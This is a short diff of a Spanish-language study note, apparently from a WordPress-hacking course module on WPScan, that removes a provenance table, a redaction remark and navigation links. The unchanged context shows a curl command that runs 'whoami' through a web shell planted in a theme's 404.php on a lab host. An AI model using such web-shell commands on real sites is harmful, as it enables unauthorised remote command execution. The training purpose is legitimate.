@@ -64,13 +64,3 @@ Valid Combinations Found:
 ```bash
 curl http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?0=whoami
 ```
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | 19- Hacking WordPress/WPScan.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-Se han sustituido valores literales de autenticación o direcciones de correo por marcadores. Los detalles sin valores están en [el registro de redacciones](../../Resources/Audit/redactions.csv).
-
-[Índice de categoría](../README.md) · [Inicio](../../README.md)
